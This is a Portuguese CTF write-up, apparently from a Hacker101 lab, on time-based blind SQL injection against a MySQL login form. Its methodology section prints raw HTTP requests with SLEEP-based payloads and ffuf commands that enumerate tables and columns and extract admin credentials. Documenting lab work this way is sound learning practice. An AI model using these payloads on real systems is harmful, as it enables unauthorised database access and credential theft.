## Objetivo
Descobrir table_name from information_schema.table no MySQL e depois usando o table_name descobrir o column_name no mesmo modelo pra conseguir com precisão achar o username e o password usando Time-Blind-SQLi

## Vulnerabilidade Identificada
O parâmetro do login é concatenado diretamente na query SQL sem sanitização, permitindo injeção que cause erro visível de resposta de tempo de servidor 



## Metodologia
Primeiro identifiquei o DB usando sqlmap
<img width="784" height="88" alt="image" src="https://github.com/user-attachments/assets/fb7a8f75-5134-4563-a46d-e25962d09d46" />
<br>
<br>
Após identificar como MySQL fiz o teste para ver se minha condição de verdadeiro estava funcionando corretamente
``' OR IF(1=1, SLEEP(5), 0)-- -``
<br>
<br>
com uma diferença clara de tempo de resposta criei uma wordlist de a-z, 0-9 & A-Z; chamada de charset.txt 
depois criei uma reques.txt para alocar a request com o SQLi, após isso rodei a ffuf attack-line com ``-ft '<4000'`` para filtrar TRUE fiz posição por posição até posição retornar falso.



## Comandos Utilizados

req.txt
```bash
POST /login HTTP/2
Host: 96c646d4349fef4c790e3a4c705c96cf.ctf.hacker101.com
Cookie: _ga_W62NXF3JMB=GS2.1.s1792415695$o1$g1$t1792415897$j15$l0$h0; _ga=GA1.1.166072869.1792415695
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 155
Origin: https://96c646d4349fef4c790e3a4c705c96cf.ctf.hacker101.com
Dnt: 1
Sec-Gpc: 1
Referer: https://96c646d4349fef4c790e3a4c705c96cf.ctf.hacker101.com/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=' OR IF((SELECT BINARY SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 1)='FUZZ', SLEEP(5), 0)-- -&password=x
```

# ffuf attack-line
```bash
ffuf -w /home/luweed/Documents/charset.txt:FUZZ \
     -request /home/luweed/Documents/reques.txt \
     -request-proto https \
     -ft '<4000' \
     -t 1
```

# depois de mapear a table_name usando OFFSET 1 foi possivel achar a table ``admins`` então usei a mesma lógica pra extrair dela, 
```bash
POST /login HTTP/2
Host: 96c646d4349fef4c790e3a4c705c96cf.ctf.hacker101.com
Cookie: _ga_W62NXF3JMB=GS2.1.s1792415695$o1$g1$t1792415897$j15$l0$h0; _ga=GA1.1.166072869.1792415695
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 158
Origin: https://96c646d4349fef4c790e3a4c705c96cf.ctf.hacker101.com
Dnt: 1
Sec-Gpc: 1
Referer: https://96c646d4349fef4c790e3a4c705c96cf.ctf.hacker101.com/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=' OR IF((SELECT BINARY SUBSTRING(column_name,5,1) FROM information_schema.columns WHERE table_name='admins' LIMIT 1 OFFSET 2)='FUZZ', SLEEP(5), 0)-- -&password=x

```
# Resultou em colunas comuns ``username`` & ``password`` usando isso mapeei o user e a senha com a reques3.txt
```bash
POST /login HTTP/2
Host: 96c646d4349fef4c790e3a4c705c96cf.ctf.hacker101.com
Cookie: _ga_W62NXF3JMB=GS2.1.s1792415695$o1$g1$t1792415897$j15$l0$h0; _ga=GA1.1.166072869.1792415695
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Origin: https://96c646d4349fef4c790e3a4c705c96cf.ctf.hacker101.com
Dnt: 1
Sec-Gpc: 1
Referer: https://96c646d4349fef4c790e3a4c705c96cf.ctf.hacker101.com/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=' OR IF((SELECT BINARY SUBSTRING(password,1,1) FROM admins LIMIT 1)='FUZZ', SLEEP(5), 0)-- -&password=x
```

## Resultado
user: ``jacqualine`` password: ``trinidad``

## Lições Aprendidas
Aprendi a enumerar dados via blind SQLi em Mysql, precisou usar ``-t 1`` no ffuf porque o servidor processava uma por vez. e também aprendi que BINARY força sensitive-case em MySQL e relembrei que ``OFFSET 1`` pula pro proximo item
